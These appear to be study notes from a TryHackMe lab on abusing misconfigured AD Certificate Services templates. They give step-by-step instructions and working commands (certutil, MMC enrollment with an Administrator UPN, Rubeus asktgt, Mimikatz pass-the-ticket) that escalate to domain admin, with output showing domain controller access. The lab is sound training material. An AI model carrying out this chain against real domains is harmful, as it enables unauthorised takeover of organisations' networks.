# Exploiting Certificates
## AD Certificate Services
- Microsoft's Public Key Infrastructure implementation
- AD provides a level of trust in an organization, it can be used as a Certificate Authority to prove and delegate trust
- AD CS is a privileged function, usually runs on selected Domain Controllers
- Normal user accounts are unable to interact with the service directly

### PKI
- Public Key Infrastructure is a system that manages certificates and public key encryption

### AD CS
- Active Directory Certificate Services
- Microsoft's PKI implementation
- Runs on Domain Controllers

### Certificate Authority
- Is a PKI that issues certificates

### Certificate Template
- Collection of settings and predefined rules that determine the format and content of certificates issued by the CA
- Admin of AD CS can create several templates that can allow any user with relevant permissions to request a certificate themselves

### Certificate Signing Request
- Message sent to a Certificate Authority to request a signed certificate

## Finding Vulnerable Certificate Templates
From Exploiting GPOs task, members of `IT Support` group now have admin and RDP permission on THMSERVER2.
- RDP into THMSERVER2 using account from `IT Support` group  

Use `certutil` to find vulnerable templates

<pre>certutil -Template -v > VulnTemplate.txt</pre>

A certificate template is deemed misconfigured if a combinatin of parameter values becomes poisonous, allowing the requestor to perform privilege escalation.  

We are looking for a template with the following parameter combination:
- `Client_Authentication` Certificate can be used for Client Authentication  
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` Certificate template allows us to specify the Subject Alternative Name  
- `CTPRIVATEKEY_FLAG_EXPORTABLE_KEY` Certificate will be exportable with the private key  
- `Certificate_Permissions` We have the required permissions to use the certificate template

[Vulnerable Template](../../Images/VulnTemplate.txt)

From the file above, Template[32] is the vulnerable template:
- Machine account THMSERVER2 can issue a CSR template that allows us to specify SAN and can be used for client authentication

## Exploiting a Certificate Template
- RDP into THMSERVER2
- Request certificate

1. Click Start > Run  
2. Type `mmc` and hit enter  
3. Click File > Add/Remove Snap-in...  
4. Add the certificate snap-in and make sure to select `Computer Account` and `Local Computer` on the prompts  
5. Click Ok  

Request a personal certificate:
1. Right Click on Personal and select All Tasks > Request New Certificate...  
2. Click Next twice to select the AD enrollment policy  
3. You will see that we have one template that we can request, but first, we need to provide additional information  
4. Click on the More Information warning  
5. Change the `Subject Name Type` option to `Common Name` and provide any value, since it does not matter, and click Add  
6. Change the `Alternative Name` Type option to `User Principal Name`  
7. Supply the `UPN` of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add  
8. Apply and then Ok  
9. Select the certificate and click Enroll  

![Alt text](<../../Images/Exploit Certificate Properties.png>)

Certificate should now be visible in Certificate OU:

![Alt text](<../../Images/Certificate Generated.png>)

Export certificate with private key:
Export certificate with the private key:
1. Right-click on the certificate and select All Tasks > Export...  
2. Click Next, select Yes, export the private key, and click Next  
3. Click Next, then set a password for the certificate since the private key cannot be exported without a password  
4. Click Next and select a location to store the certificate  
5. Click Next and finally click Finish

## User Impersonation through a Certificate
- Use the certificate to request a Kerberos TGT
- Load the Kerberos TGT into hacking platform of choice

#### Rubeus
- Post-exploitation tool used in Windows environments for Kerberos ticket manipulation

<pre>Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:</pre>

`/user` specify the user that we will be impersonating and has to match the UPN for the certificate we generated  
`/enctype` specify the encryption type for ticket  
`/certificate` path to certificate we have generated  
`/password` password for certificate file  
`/outfile` file where TGT will be output to  
`/domain` FQDN of the domain we are attacking  
`/dc` ip address of the Domain Controller we are requesting TGT from (Domain Controller that has CA running)  

<pre> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cameron.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.79.101</pre>  

- Use Mimikatz to load the TGT and authenticate to THMDC  

<pre>mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK

mimikatz # exit


C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  08:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:24 AM               154 dns_entries.csv
04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
09/15/2018  08:19 AM    <DIR>          PerfLogs
03/21/2020  09:31 PM    <DIR>          Program Files
03/21/2020  09:28 PM    <DIR>          Program Files (x86)
04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1
04/25/2022  07:13 PM    <DIR>          tmp
04/27/2022  08:22 AM    <DIR>          Users
04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:12 PM    <DIR>          Windows
               7 File(s)      2,356,811 bytes
               7 Dir(s)  50,914,541,568 bytes free
</pre>  

We now have access to Tier 0 infrastructure (Domain Controller) and have compromised the full child domain.